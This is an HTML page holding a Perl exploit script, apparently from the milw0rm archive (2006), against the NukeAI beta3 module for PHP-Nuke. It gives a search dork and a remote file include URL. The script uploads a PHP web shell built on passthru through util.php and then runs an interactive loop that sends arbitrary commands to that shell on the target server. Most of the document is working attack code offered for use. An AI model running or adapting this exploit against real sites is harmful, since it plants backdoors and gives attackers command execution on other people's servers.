<html><head><title>PHP-Nuke NukeAI Module 3b (util.php) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl
#
+-------------------------------------------------------------------------------------------
# + nukeai beta3 (util.php) Remote Code Execution Vulnerability
#
+-------------------------------------------------------------------------------------------
# + Affected Software .: nukeai beta3
# + Download ..........: http://mesh.dl.sourceforge.net/sourceforge/nukeai/nukeai_beta3.zip
# + Dork ..............: &quot;nukeai beta3&quot;
# + Class .............: Remote Code Execution
# + Risk ..............: High (Remote Code Execution)
# + Found By ..........: DeltahackingTEAM Code :Dr.Trojan&amp;Dr.Pantagon
# + Exploit:http://[target]/[path]/modules/NukeAI/util.php?AIbasedir=http://
# +-------------------------------------------------------------------------------------------
# + Details:
# + nukeai beta3 Download by default installation doesn't prevent any of the files in the
# + modules/NukeAI directory from being accessed by a client. The modules/NukeAI
# + file takes input passed to the script by util.php and writes it to $_POST[&quot;filename&quot;].0
# + unsanatized in the modules/NukeAI descriptions directory.
# +
# + Vulnerable Code:
# +require_once $AIbasedir.&quot;/NukeAI/util.php&quot;;
# +-------------------------------------------------------------------------------------------
# Example: http://[site]/modules/NukeAI/util.php?AIbasedir=[php shell]

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$code = &quot;&lt;?php passthru(\$_GET[cmd]); ?&gt;&quot;;

main();

sub usage
{
    print &quot;DeltahackingSecurityTEAM\n&quot;;
    print &quot;www.deltahacking.net\n&quot;;
    print &quot;Dr.Trojan,HIV++,D_7j,Lord,VPc,IMpostor,Dr.Pantagon\n&quot;;
    print &quot; http://advistory.deltahacking.net((we Bug))\n&quot;;
    print &quot;\nukeai beta3 Remote Code Execution Exploit\n&quot;;
    print &quot;-h, --host\ttarget host\t(example.com)\n&quot;;
    print &quot;-f, --file\tshell file\t(shell.php)\n&quot;;
    print &quot;-d, --dir\tinstall dir\t(/NukeAI)\n&quot;;
    print &quot;============================================================================farzad.sharifi\r\n&quot;;
    exit;
}

sub main
{
    GetOptions ('h|host=s' =&gt; \$host,'f|file=s' =&gt; \$file,'d|dir=s' =&gt; \$dir);
    usage() unless $host;

    $dir = &quot;/NukeAI&quot; unless $dir;
    $file = &quot;shell.php&quot; unless $file;
    uri_escape($cmd);
    $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;) or die &quot;\nconnect() failed.\n&quot;;

    print &quot;\nconnected to &quot;.$host.&quot;, sending data.\n&quot;;
    $sendurl = &quot;description=0&amp;moreinfo=&quot;.$code.&quot;&amp;accesses=0&amp;filename=&quot;.$file.&quot;&amp;date=&amp;B1=Submit&quot;;
    $sendlen = length($sendurl);
    print $sock &quot;POST &quot;.$dir.&quot;NukeAI/util.php?AIbasedir= HTTP/1.1\n&quot;;
    print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
    print $sock &quot;Connection: close\n&quot;;
    print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
    print $sock &quot;Content-Length: &quot;.$sendlen.&quot;\n\n&quot;;
    print $sock $sendurl;
    print &quot;attempted to create php shell, server response:\n\n&quot;;
    while($recvd = &lt;$sock&gt;)
    {
        print &quot; &quot;.$recvd.&quot;&quot;;
    }

    while($cmd !~ &quot;~quit&quot;)
    {
        print &quot;\n\n-&gt; &quot;;
        $cmd = &lt;STDIN&gt;;
        if ($cmd !~ &quot;~quit&quot;)
        {
          $sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$host&quot;,PeerPort=&gt;&quot;80&quot;)
           or die &quot;connect() failed.\n&quot;;
          $sendurl = uri_escape($cmd);

          print $sock &quot;GET &quot;.$dir.&quot;/descriptions/&quot;.$file.&quot;.0?cmd=&quot;.$sendurl.&quot; HTTP/1.1\n&quot;;
          print $sock &quot;Host: &quot;.$host.&quot;\n&quot;;
          print $sock &quot;Accept: */*\n&quot;;
          print $sock &quot;Connection: close\n\n&quot;;
          print &quot;\n&quot;;

          while($recvd = &lt;$sock&gt;)
          {
              print $recvd;
          }
        }
    }
    exit;
}

# milw0rm.com [2006-11-24]</pre></html>